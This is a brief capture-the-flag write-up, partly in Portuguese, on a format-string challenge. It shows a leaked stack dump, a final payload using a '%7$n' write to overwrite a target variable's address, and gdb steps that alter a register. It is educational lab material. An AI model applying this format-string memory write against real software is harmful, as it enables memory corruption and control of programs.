# Challenge `Write_to_Memory` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format strings
- Where: Where is the vulnerability present
  - Buffer
- Impact: What results of exploiting this vulnerability
  - Mudar o valor de uma variavel 

1. Comecei por ver onde é que seria escrito os chars AAAA no buffer, no 7 endereço

AAAAAAAAAAfffe788c|7f|fffe78f4|80482f8|f7f5869d|804825c|41414141|41414141|78254141|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|7c7825|293a1000|

2. como queria modificar o valor do target escrevi os chars printed até ao endereço 

3. payload final: python -c 'print "\x40\xa0\x04\x08"+"%7$n"'

4. Pelo gdb:

0x08048693 <+86>:	test   eax,eax

b *0x08048693

r < input

set $eax=1

i r eax 
